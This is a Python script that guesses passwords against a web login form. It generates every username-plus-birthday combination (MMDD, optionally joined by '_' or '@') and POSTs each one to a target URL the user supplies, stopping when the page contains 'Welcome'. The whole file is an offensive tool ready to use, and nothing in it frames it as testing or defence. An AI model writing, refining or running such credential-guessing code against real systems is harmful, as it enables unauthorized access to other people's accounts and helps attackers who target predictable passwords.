import requests

def generate_passwords(username, symbol):
    passwords = []
    for month in range(1, 13):
        for day in range(1, 32):
            if month == 2 and day > 29:
                continue
            if month in [4, 6, 9, 11] and day > 30:
                continue
            birthday = f"{month:02d}{day:02d}"
            if symbol == "none":
                password = f"{username}{birthday}"
            else:
                password = f"{username}{symbol}{birthday}"
            passwords.append(password)
    return passwords

def attempt_login(url, user_field, pass_field, username, passwords):
    for password in passwords:
        data = {
            user_field: username,
            pass_field: password
        }
        try:
            response = requests.post(url, data=data)
            if "Welcome" in response.text:  # ←成功判定は適宜変更
                print(f"[✔] Success: {username}:{password}")
                return
            else:
                print(f"[×] Failed: {password}")
        except requests.RequestException as e:
            print(f"[!] Error: {e}")
    print("[!] All passwords tried. No success.")

def main():
    url = input("[?] Enter target login URL: ").strip()
    username = input("[?] Enter the username: ").strip()
    symbol = input("[?] Choose a symbol before birthday (_/@/none): ").strip()
    if symbol not in ['_', '@', 'none']:
        print("[!] Invalid symbol. Use _, @, or none.")
        return

    user_field = input("[?] Enter form field name for username: ").strip()
    pass_field = input("[?] Enter form field name for password: ").strip()

    print("[+] Generating passwords...")
    passwords = generate_passwords(username, symbol)

    print("[+] Starting login attempts...")
    attempt_login(url, user_field, pass_field, username, passwords)

if __name__ == "__main__":
    main()
